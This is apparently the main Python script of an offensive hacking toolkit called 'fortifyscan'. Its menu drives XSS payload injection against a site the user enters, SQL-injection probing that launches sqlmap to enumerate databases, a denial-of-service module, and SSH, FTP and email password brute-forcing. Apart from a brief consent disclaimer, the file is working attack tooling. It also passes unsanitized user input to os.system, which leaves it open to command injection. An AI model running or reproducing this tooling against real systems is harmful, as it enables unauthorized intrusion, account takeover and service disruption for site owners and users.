
import sys,os
import pyfiglet
import requests

purple = '\033[95m'
blue = '\033[94m'
green = '\033[92m'
yellow = '\033[93m'
red = '\033[91m'
default = '\033[0m'
underline = '\033[4m'
orange = '\033[33m'

def print_info_and_heads():
    head = default+blue+"""
             .--.
            |o_o | 
            |:_/ | 
           //   \ \\
          (|     | )
         /'\_   _/`\\
         \___)=(___/  
         Version-> 1.0
       Author-> Cyber-Knight

        """

    print(f"""{head}""")

def Code_Version():
	VERSION = blue+'1.0'+default
	AUTHOR =  blue+'Cyber-Knight'+default
	print("""
		#################################
		#                               # 
		#          Version-> %s        #
		#                               #
		#          Author->  %s # 
		#                               #
		#################################
		""" % (VERSION, AUTHOR))

def banner_info():
    font = pyfiglet.Figlet()
    art = font.renderText("fortifyscan")
    print(blue+ art +blue)

def declaration():
	print(red+'''
    This program was created for review and not for causing harm.
    Usage of fortifyscan for attacking targets without prior mutual consent is illegal.
    Developers assume no liability and are not responsible for any misuse or damage caused by this program.
    '''+default)

def read_xss_payloads():
    payloads = []
    try:
        with open('/home/ubuntu/Desktop/Github-My-Repo/FortifyScan_Toolbox/modules/password/xss_payload_list.txt', 'r') as file:
            payloads = file.readlines()
    except Exception as e:
        print(red + '[!]' + ' Error reading payloads: ' + str(e) + default)
    return payloads

def advanced_XXS_attack():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner_info()

    print('Enter Your Evildoer Site:')
    try:
        site = input(blue + 'fortifyscan»XXS»' + default)
    except Exception as e:
        print(red + '\nError: ' + str(e) + default)
        return

    if "http://" not in site and "https://" not in site:
        site = 'http://' + site

    try:
        res = requests.get(site)
        res.raise_for_status()
        print(yellow + '[+]' + green + ' Site seems to exist in this dimension' + default)

        payloads = read_xss_payloads()

        for payload in payloads:
            crafty_payload = f';<script>document.write("{payload.strip()}");</script>'
            site_xss = site + crafty_payload
            res = requests.get(site_xss)

            if payload.strip() in res.text:
                print(underline + yellow + '[++]' + blue + ' Site ' + site + ' succumbs to the XSS darkness' + default)
                print(yellow + 'Payload: ' + green + site_xss + default)
                break  # No need to try other payloads if one works
            else:
                print(red + '[!]' + ' Site rejected our devious payload, pathetic!' + default)

    except requests.RequestException as e:
        print(red + '[!] Error: ' + str(e) + default)

def advaced_SQL_attack():
    os.system('clear')
    banner_info()
    print(green + 'Enter site:' + default)
    site = input(blue + 'fortifyscan»SqlScaner»' + default)

    if "http://" not in site and "https://" not in site:
        site = 'http://' + site
    else:
        pass

    if "id=" not in site:
        print(red + '[!]' + default + ' Site doesnt have id parameters')
    else:
        print(yellow + '[*]' + green + ' Site ' + site + ' has "id" param')

    try:
        res = requests.get(site)
        res.raise_for_status()  # Raise an error for bad responses
        print(yellow + '[+]' + green + ' Site works' + default)

    except requests.RequestException as e:
        print(red + '[!]' + default + f' Site doesn\'t work: {e}')

    try:
        info = res.text  # Adjust as needed based on the response structure
        print('#####################Info#####################')
        print(info)
        print('##############################################')

        bad_site = site + '\'"'
        res = requests.get(bad_site)

        if 'You have an error in your SQL syntax' not in res.text:
            print(yellow + '[--]' + red + ' Site ' + site + ' does not have SQL Error' + default)
        else:
            print(yellow + '[++]' + purple + ' Site ' + red + site + purple + ' has SQL Error' + default)
            print('Start sqlmap?')
            y = input('Y/n->')

            if y == "Y" or y == 'y':
                os.system('sqlmap -u ' + site + ' --dbs')
            else:
                print(yellow + '<< Goodbye >> ' + default)

    except requests.RequestException as e:
        print(red + f'Fatal error: {e}' + default)

def Dos_attack():
	os.system('clear')
	banner_info()
	os.system('python3 modules/dos.py')

def SSH_brutforce_attack():
	os.system('clear')
	banner_info()
	try:
		print(red+'Brutforse ssh mode!!'+default)
		print('Enter target host:')
		host = input(yellow+'fortifyscan»SSH»Host»'+default)
		print(green+'Enter username:'+default)
		print(green+'Default: admin'+default)
		user = input(yellow+'fortifyscan»SSH»User»'+default)
		if user == "":
			user = 'admin'
		print(green+'Enter password file:'+default)
		password = input(yellow+'fortifyscan»SSH»Password»'+default)

		if password == "":
			print('Enter password file')
			sys.exit(1)
		os.system('python3 modules/ssh.py '+host+' '+user+' '+password)
	except:
		print(red+' User aborting !!')
		exit()

def FTP_brutforce_attack():
	os.system('clear')
	banner_info()
	print(red+'Brutforse ftp mode!!'+default)
	print(blue+'Enter host:'+default)
	host = input(yellow+'fortifyscan»Ftp»Host»'+default)
	print(blue+'Enter user:'+default)
	print(red+'Default: admin')
	user = input(yellow+'fortifyscan»Ftp»User»'+default)
	print(blue+'Enter password file:'+default)
	password_list = input(yellow+'fortifyscan»Ftp»Password»'+default)
	if user == '':
		user = 'admin'
	if password_list == '':
		print('Enter password list')
		sys.exit(1)
	os.system('python3 modules/ftp.py '+host+' '+user+' '+password_list)

def mail_brutforce_attack():
	os.system('clear')
	banner_info()
	print(purple+'Brut mail account'+default)
	print(blue+'Enter login:'+default)
	mail = input(yellow+'fortifyscan»Mail»Login»'+default)
	print(blue+'Enter password list:'+default)
	password = input(yellow+'fortifyscan»Mail»Password»'+default)
	if password == '':
		print(red+'Password list: password/password_list.txt'+default)
		password = 'password/password_list.txt'
	os.system('python3 modules/mail.py '+mail+' '+password)


def Main_Menu_Options():
    banner_info()
    print_info_and_heads()
    declaration()
    print('\n')
   

    while True:

        print(blue+'''
        Menu options:
        '''+default+'''
        1) Cross-Site Scripting (XSS)
        2) SQL Injection
        3) Denial of Service (DoS) Attack on Websites
        4) FTP Bruteforce Attack
        5) SSH Bruteforce Attack
        6) Email Brute Force Attack
        7) Exit
        '''+yellow+'''-------------------'''+default)
        

        try:
            user_input = input('fortifyscan-» ')
        except:
            print(' Good bye ')
            exit()

        if user_input == 'version':
            print_info_and_heads()
        elif int(user_input) == 1:
            advanced_XXS_attack()
        elif int(user_input) == 2:
            advaced_SQL_attack()
        elif int(user_input) == 3:
            Dos_attack()
        elif int(user_input) == 4:
            FTP_brutforce_attack()
        elif int(user_input) == 5:
            SSH_brutforce_attack()
        elif int(user_input) == 6:
            mail_brutforce_attack()
        elif int(user_input) == 7:
            print(blue+'[!]'+' Program Exit '+default)
            exit()
        else:
            print(red+'[!]'+' You entered an incorrect value '+default)
            print('Please enter a number between 1 and 7.')

# Call the Main_Menu function
Main_Menu_Options()



